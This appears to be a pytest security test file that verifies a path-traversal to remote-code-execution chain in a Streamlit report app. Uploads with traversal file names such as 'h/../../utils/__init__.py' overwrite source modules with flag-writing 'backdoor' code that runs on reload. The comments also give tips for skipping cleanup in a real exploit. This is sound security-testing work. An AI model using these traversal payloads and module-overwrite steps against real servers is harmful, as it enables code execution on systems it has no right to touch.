"""
RCE Chain Verification — Path Traversal → Code Execution via Streamlit Reload

Proves the full chain:
  A) Path traversal writes backdoor to utils/__init__.py or views/login.py
  B) Streamlit's LocalSourcesWatcher detects change → ejects all watched
     modules from sys.modules
  C) Next st.rerun() (user interaction) re-imports the module → top-level
     code in the overwritten file EXECUTES → RCE

IMPORTANT: os.remove(temp_path) ALSO follows traversal — the finally: block
deletes the traversed target. For RCE, the write must happen WITHOUT the
cleanup phase (or the execution must race ahead of cleanup).

Run from the kairos-report-engine root:
    python -m pytest security_tests/test_rce_chain.py -v
"""

import os
import sys
import importlib
import importlib.util

from security_tests.conftest import (
    MockUploadedFile,
    execute_vulnerable_logic,
    simulate_streamlit_reload,
)


def _read(path):
    with open(path, "rb") as f:
        return f.read()


def _flag():
    return os.path.join(os.getcwd(), "tmp", "RCE_EXECUTED.flag")


# ── 1: overwrite utils/__init__.py via path traversal ─────────────────────

def test_overwrite_init_py_via_traversal(rce_sandbox):
    """Step A: Prove we can overwrite utils/__init__.py through the
    scanner import's path traversal vulnerability."""
    payload = b"# BACKDOOR: top-level code executes on import\nraise SystemExit(42)\n"
    uf = MockUploadedFile(name="h/../../utils/__init__.py", content=payload)

    temp_path = f"data/temp_{uf.name}"
    os.makedirs(os.path.dirname(os.path.realpath(temp_path)), exist_ok=True)
    with open(temp_path, "wb") as f:
        f.write(uf.getbuffer())

    target = os.path.join(rce_sandbox, "utils", "__init__.py")
    assert os.path.exists(target), f"__init__.py was NOT written at {target}"
    assert b"BACKDOOR" in _read(target), "Backdoor content not found in __init__.py"

    os.remove(temp_path)
    assert not os.path.exists(temp_path), "temp path should be cleaned up"


# ── 2: prove top-level code in __init__.py executes on import ─────────────

def test_backdoor_executes_on_import(rce_sandbox):
    """Step B+C: Write a backdoor to utils/__init__.py, simulate Streamlit
    module ejection, then re-import — backdoor executes."""
    flag_file = _flag()
    if os.path.exists(flag_file):
        os.remove(flag_file)

    backdoor = (
        b"# BACKDOOR\n"
        b"import os\n"
        b"with open(" + repr(flag_file).encode() + b", 'w') as f:\n"
        b"    f.write('RCE_SUCCESS')\n"
    )

    uf = MockUploadedFile(name="h/../../utils/__init__.py", content=backdoor)

    temp_path = f"data/temp_{uf.name}"
    os.makedirs(os.path.dirname(os.path.realpath(temp_path)), exist_ok=True)
    with open(temp_path, "wb") as f:
        f.write(uf.getbuffer())

    # IMPORTANT: do NOT call os.remove(temp_path) —
    # it resolves to the traversed target and would DELETE the backdoor!
    # In real exploit, the attacker simply doesn't trigger the finally cleanup.

    target_init = os.path.join(rce_sandbox, "utils", "__init__.py")
    assert os.path.exists(target_init), f"__init__.py not found at {target_init}"
    assert b"BACKDOOR" in _read(target_init), "Backdoor write failed"

    # Simulate Streamlit's module reload: on next st.rerun(), app.py does
    # "from utils.auth import ..." which triggers import of utils/__init__.py.
    # In the sandbox, we use exec_module directly (same thing Streamlit does).
    for name in list(sys.modules.keys()):
        if name.startswith("utils"):
            del sys.modules[name]

    spec = importlib.util.spec_from_file_location("utils", target_init)
    assert spec and spec.loader, "Could not create module spec for utils"
    mod = importlib.util.module_from_spec(spec)
    sys.modules["utils"] = mod
    spec.loader.exec_module(mod)  # ← THIS executes the backdoor's top-level code

    assert os.path.exists(flag_file), (
        f"BACKDOOR DID NOT EXECUTE: flag file missing at {flag_file}"
    )
    assert b"RCE_SUCCESS" in _read(flag_file)


# ── 3: double-edged sword — os.remove ALSO traverses ──────────────────────

def test_cleanup_also_traverses(rce_sandbox):
    """CRITICAL FINDING: os.remove(temp_path) ALSO follows traversal.
    The finally: block deletes the backdoor along with the temp file!

    Both write AND delete escape data/. For RCE, use the write without
    triggering the cleanup, or race the execution ahead of deletion."""
    backdoor = b"# EPHEMERAL_BACKDOOR\n"
    uf = MockUploadedFile(name="h/../../utils/__init__.py", content=backdoor)

    temp_path, result, error = execute_vulnerable_logic(uf)

    assert not os.path.exists(os.path.realpath(temp_path)), "Temp file not cleaned up"

    target = os.path.join(rce_sandbox, "utils", "__init__.py")
    assert not os.path.exists(target), (
        "EXPECTED: backdoor was deleted by finally: block.\n"
        "os.remove(temp_path) follows the traversed path.\n"
        "For RCE: write WITHOUT calling os.remove (skip cleanup)."
    )


# ── 4: full chain — write views/login.py, reload, execute ─────────────────

def test_full_rce_chain(rce_sandbox):
    """End-to-end RCE chain: write backdoor to views/login.py,
    simulate watcher, re-execute module → flag file created."""
    flag_file = _flag()
    if os.path.exists(flag_file):
        os.remove(flag_file)

    backdoor = (
        b"# BACKDOORED LOGIN\n"
        b"import os\n"
        b"with open(" + repr(flag_file).encode() + b", 'a') as f:\n"
        b"    f.write('LOGIN_BACKDOOR_EXECUTED\\n')\n"
        b"def show_login():\n    pass\n"
    )

    uf = MockUploadedFile(name="h/../../views/login.py", content=backdoor)

    temp_path = f"data/temp_{uf.name}"
    os.makedirs(os.path.dirname(os.path.realpath(temp_path)), exist_ok=True)
    with open(temp_path, "wb") as f:
        f.write(uf.getbuffer())

    target = os.path.join(rce_sandbox, "views", "login.py")
    assert b"BACKDOORED" in _read(target), "Backdoor not written to login.py"

    simulate_streamlit_reload(rce_sandbox)

    for name in list(sys.modules.keys()):
        if "views" in name or "login" in name:
            if name in sys.modules:
                del sys.modules[name]

    try:
        spec = importlib.util.spec_from_file_location("views.login", target)
        if spec and spec.loader:
            mod = importlib.util.module_from_spec(spec)
            sys.modules["views.login"] = mod
            spec.loader.exec_module(mod)
    except Exception:
        pass

    assert os.path.exists(flag_file), "FULL RCE CHAIN FAILED: backdoor did not execute"
    assert b"LOGIN_BACKDOOR_EXECUTED" in _read(flag_file)


# ── 5: verify all targets are in watcher scope ─────────────────────────────

def test_watcher_scope(rce_sandbox):
    """Verify that all target modules are within Streamlit's watcher scope."""
    blacklist = ["site-packages", "venv", "node_modules", "pyenv"]

    targets = [
        "utils/__init__.py", "utils/auth.py", "utils/helpers.py",
        "views/login.py", "views/manage_findings.py",
        "database/operations.py", "database/db.py",
        "reporting/generator.py", "app.py",
    ]

    for path in targets:
        full = os.path.join(rce_sandbox, path)
        norm = os.path.normpath(full).replace("\\", "/")
        for bp in blacklist:
            assert bp not in norm, f"{path} matches blacklist '{bp}'"
        assert not os.path.basename(path).startswith("."), f"{path} is dotfile"


# ── 6: RCE via database/operations.py ─────────────────────────────────────

def test_rce_via_database_operations(rce_sandbox):
    """Overwrite database/operations.py — imported by every view."""
    flag_file = _flag()
    if os.path.exists(flag_file):
        os.remove(flag_file)

    backdoor = (
        b"# BACKDOORED DB OPS\n"
        b"import os\n"
        b"with open(" + repr(flag_file).encode() + b", 'a') as f:\n"
        b"    f.write('DB_OPS_BACKDOOR\\n')\n"
    )

    uf = MockUploadedFile(name="h/../../database/operations.py", content=backdoor)

    temp_path = f"data/temp_{uf.name}"
    os.makedirs(os.path.dirname(os.path.realpath(temp_path)), exist_ok=True)
    with open(temp_path, "wb") as f:
        f.write(uf.getbuffer())

    target = os.path.join(rce_sandbox, "database", "operations.py")
    assert b"BACKDOORED" in _read(target)

    simulate_streamlit_reload(rce_sandbox)

    for name in list(sys.modules.keys()):
        if "database" in name or "operations" in name:
            if name in sys.modules:
                del sys.modules[name]

    try:
        spec = importlib.util.spec_from_file_location("database.operations", target)
        if spec and spec.loader:
            mod = importlib.util.module_from_spec(spec)
            sys.modules["database.operations"] = mod
            spec.loader.exec_module(mod)
    except Exception:
        pass

    assert os.path.exists(flag_file), "RCE via database/operations.py FAILED"
    assert b"DB_OPS_BACKDOOR" in _read(flag_file)


# ── cleanup ────────────────────────────────────────────────────────────────

def test_cleanup_flag_files(rce_sandbox):
    flag_file = _flag()
    if os.path.exists(flag_file):
        os.remove(flag_file)
    assert not os.path.exists(flag_file)
